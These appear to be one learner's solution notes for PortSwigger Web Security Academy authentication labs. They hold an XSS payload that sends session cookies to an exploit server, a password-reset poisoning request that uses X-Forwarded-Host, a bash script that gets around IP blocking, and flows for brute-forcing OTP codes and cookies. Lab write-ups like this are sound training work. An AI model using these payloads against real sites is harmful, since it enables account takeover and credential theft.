### Username enumeration via different responses
**Flow** : bruteforce username and password using wordlist given from portswigger

### 2FA simple bypass
**Flow** : login as wiener -> input 2FA -> go to page /my-account -> logout -> login as carlos -> skip page input 2FA -> direct to page /my-account -> solved

### Password reset broken logic
**Flow** : normal flow forgot password -> release on POST forgot password there is username payload -> repeat flow forgot password -> intercept on request -> change username payload to carlos

### Username enumeration via subtly different responses
**Flow** : normal flow login -> intruder (cluster bomb attack) put payload for every position -> response have different length and the same status code -> filteing by negative 'Invalid username or password'

### Username enumeration via response timing
**Flow** : Intruder login pitchfork -> add header `X-Forwarded-For` to bypass IP blocker -> add payload number on `X-Forwarded-For` header -> add payload first on username -> add >100 string on password -> start the attack -> lookup that 'adm' payload required long time -> it means that's the correct username -> bruteforce the password

### Broken brute-force protection, IP block
**Payload**:
```bash
while IFS= read -r line; do                                                 
  if (( i % 2 == 0 )); then
    echo -e "peter"
  fi
  echo "$line"
  ((i++))
done < "pwlist.txt"

while IFS= read -r line; do                                                
  if (( i % 2 == 0 )); then
    echo -e "wiener"
  fi
  echo "carlos"
  ((i++))
done < "userlist.txt"
```
**Penjelasan**: 
sistem akan block IP setiap 2x percobaan login dan salah password, dan akan reset ketika benar login

### Username enumeration via account lock
**Flow** :
login -> intruder cluster -> bruteforce username with null password -> bruteforce password

### 2FA broken logic
**Flow** :
there is request GET /login2 that initiate web server to send OTP -> change the cookies verify value to carlos -> send the request -> sen the POST /login2 to intruder to bruteforce the OTP from 1000 to 9999

### Brute-forcing a stay-logged-in cookie
**Flow** :
login as wiener (save login) -> reliaze cookies save-login is base64 (wiener:md5pw) -> send to intruder /myaccount -> bruteforce it by adding payload processing hashing md5 + add prefix 'carlos:' + encode base64

### Offline password cracking
**Payload**:
```html
<script>document.location='https://EXPlOIT-WEB-SERVER.COM/'+document.cookie</script>
```

### Password reset poisoning via middleware
**Payload** :
```http
POST /forgot-password HTTP/2
Host: 0add00b604398740847bfa2d00db006b.web-security-academy.net
Cookie: session=khVpmpSCAX4Hdc4VeS7xb2awra6lQQBk
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
Origin: https://0add00b604398740847bfa2d00db006b.web-security-academy.net
Dnt: 1
Referer: https://0add00b604398740847bfa2d00db006b.web-security-academy.net/forgot-password
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
X-Forwarded-Host: exploit-0aa700c9040687978496f99c013900f0.exploit-server.net

username=carlos
```
Try `X-Forwarded-Host` support, so it dynamically change the domain on url reset password

### Password brute-force via password change
**Payload** :
login as wiener -> try feature change password -> try with the correct `current password` but new password 1 & 2 is different -> try again with the wrong `current password` and new pw 1 & 2 is different -> the response is different -> send to intruder -> change username to carlos and brute force it the `current password` and for the pw 1 & 2 is different

